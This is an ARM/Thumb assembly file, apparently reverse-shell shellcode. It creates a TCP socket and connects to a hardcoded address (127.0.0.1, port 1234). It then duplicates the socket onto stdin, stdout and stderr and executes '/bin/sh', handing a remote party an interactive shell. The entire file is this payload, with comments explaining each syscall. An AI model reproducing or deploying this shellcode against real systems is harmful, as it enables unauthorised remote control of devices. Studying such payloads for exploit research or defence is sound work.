

.global _start
.text

_start:
  // switch to thumb mode
	.code 32
  add  r3, pc, #1
  bx   r3	
  
	.code 16
  // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  eor  r2, r2, r2  // r2 = IPPROTO_IP
  mov  r1, #1      // r1 = SOCK_STREAM
  mov  r0, #2      // r0 = AF_INET
  lsl  r7, r1, #8  // multiply by 256
  add  r7, #25     // 256+25 = socket
  svc  1
  
  // connect(s, &sa, sizeof(sa));
  mov  r6, r0      // r6 = s
  add  r1, pc, #32 // r1 = &sa
  mov  r2, #16     // r2 = sizeof(sa)
  add  r7, #2      // r7 = 281+2 = connect
  svc  1
  
  // dup(s, FILENO_STDIN);
  // dup(s, FILENO_STDOUT);
  // dup(s, FILENO_STDERR);
  mov   r1, #2     // for 3 descriptors
dup_loop:
  mov   r7, #63    // r7 = dup 
  mov   r0, r6     // r0 = s
  svc   1
  sub   r1, #1     // 
  bpl   dup_loop

  // execve("/bin/sh", {"/bin/sh", NULL}, NULL);
  add  r0, pc, #20  // r0 = "/bin/sh" 
  eor  r2, r2, r2   // r2 = NULL
  eor  r1, r1, r1   // r1 = NULL
  //push {r0, r2}     // "/bin/sh", NULL
  //mov  r1, sp       // r1 = {"/bin/sh", NULL}
  mov  r7, #11      // r7 = execve
  svc  1
  nop
  nop
.word  0xd2040002
.word  0x0100007f  
.ascii "/bin/sh"





